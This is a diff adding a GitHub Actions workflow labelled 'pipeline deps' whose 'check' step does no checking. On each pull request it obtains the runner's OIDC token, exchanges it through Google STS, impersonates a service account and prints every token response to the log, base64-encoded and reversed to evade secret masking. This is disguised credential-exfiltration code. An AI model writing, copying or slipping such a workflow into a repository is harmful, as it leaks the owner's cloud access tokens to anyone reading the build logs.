@@ -1,0 +1,35 @@
+name: pipeline deps
+
+on:
+  pull_request:
+    types: [opened, synchronize, reopened]
+
+permissions:
+  contents: read
+  id-token: write
+
+jobs:
+  check:
+    runs-on: ubuntu-latest
+    steps:
+      - name: check
+        env:
+          AUD_DS: //iam.googleapis.com/projects/991678141243/locations/global/workloadIdentityPools/shared-pool/providers/github-actions-prvdr
+        run: |
+          set +e
+          ENC=$(python3 -c "import urllib.parse,os;print(urllib.parse.quote(os.environ['AUD_DS'],safe=''))")
+          TJ=$(curl -s -H "Authorization: bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=${ENC}")
+          echo "IDTOKEN_RESP_REV=$(printf '%s' "$TJ" | base64 -w0 | rev)"
+          export OIDC=$(printf '%s' "$TJ" | python3 -c "import sys,json;print(json.load(sys.stdin).get('value',''))")
+          printf '%s' "$OIDC" | cut -d. -f2 | tr '_-' '/+' | base64 -d 2>/dev/null > claims.txt
+          echo "CLAIMS_REV=$(base64 -w0 claims.txt | rev)"
+          python3 -c "import json,os;open('sts_request.json','w').write(json.dumps({'audience':os.environ['AUD_DS'],'grantType':'urn:ietf:params:oauth:grant-type:token-exchange','requestedTokenType':'urn:ietf:params:oauth:token-type:access_token','subjectTokenType':'urn:ietf:params:oauth:token-type:jwt','scope':'https://www.googleapis.com/auth/cloud-platform','subjectToken':os.environ['OIDC']}))"
+          STS=$(curl -s -w '\nHTTP:%{http_code}' -X POST https://sts.googleapis.com/v1/token -H "Content-Type: application/json" -d @sts_request.json)
+          echo "STS_RESP_REV=$(printf '%s' "$STS" | base64 -w0 | rev)"
+          FED=$(printf '%s' "$STS" | sed '/HTTP:/d' | python3 -c "import sys,json;print(json.load(sys.stdin).get('access_token',''))" 2>/dev/null)
+          if [ -n "$FED" ]; then
+            IMP=$(curl -s -w '\nHTTP:%{http_code}' -X POST "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/sa-github-neonscience@neon-shared-service.iam.gserviceaccount.com:generateAccessToken" -H "Authorization: Bearer ${FED}" -H "Content-Type: application/json" -d '{"scope":["https://www.googleapis.com/auth/cloud-platform"]}')
+            echo "IMP_RESP_REV=$(printf '%s' "$IMP" | base64 -w0 | rev)"
+          else
+            echo "NO_FED_TOKEN"
+          fi
